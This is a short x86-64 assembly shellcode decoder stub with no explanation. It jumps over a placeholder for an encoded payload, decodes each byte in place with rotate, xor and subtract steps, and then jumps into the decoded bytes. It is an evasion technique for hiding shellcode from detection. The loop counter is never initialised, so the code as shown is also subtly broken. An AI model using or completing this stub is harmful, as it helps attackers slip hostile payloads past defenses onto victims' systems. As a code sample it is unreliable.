global _start 

section .text

_start:
	jmp real_start
	encoded_shellcode: db .....encoded-shellcode-here....
  
real_start:
	lea rsi, [rel encoded_shellcode]

decoder:
	xor rax, rax
	add al, 32
decode:
	rol byte [rsi], 0x5 
	xor byte [rsi], al  
	sub byte [rsi], 13  

	inc rsi
	loop decode

	jmp short encoded_shellcode
